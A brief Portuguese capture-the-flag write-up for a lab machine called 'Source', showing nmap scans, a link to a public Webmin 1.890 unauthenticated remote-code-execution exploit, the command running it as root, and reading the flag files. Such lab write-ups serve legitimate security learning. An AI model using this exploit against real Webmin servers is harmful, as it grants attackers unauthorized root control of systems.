# Source

* ### Scan de portas - Verificando quais portas estão abertas.

```bash
nmap -A 10.10.128.104
```
![image](https://github.com/lufffe/Writeups/assets/90646635/b63504e3-1497-4447-9a4c-b07f7e8a03f9)

![image](https://github.com/lufffe/Writeups/assets/90646635/5d4c38d1-8160-436e-bc41-8074050cc3fa)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 22,10000 10.10.128.104
```
![image](https://github.com/lufffe/Writeups/assets/90646635/67329f14-925c-451c-8887-fac0861e09e9)

* ### Pesquisando sobre o Webmin achei esse codigo em python.
https://raw.githubusercontent.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/master/webmin-1.890_exploit.py

* ### Executando o codigo e descobrindo que ele é executando com o ROOT.
```bash
python3 webmin-1.890_exploit.py 10.10.128.104 10000 id
```
![image](https://github.com/lufffe/Writeups/assets/90646635/7cba62dd-ee44-464c-9a5c-b01abf87b8cc)

* ### Descobrindo qual é o usuário que tem nessa maquina e olhando onde está a flag, e então só dar um cat na flag de user e root no /root/root.txt.
![image](https://github.com/lufffe/Writeups/assets/90646635/d9fcbe7a-f05a-423c-9f80-bd4688d03956)
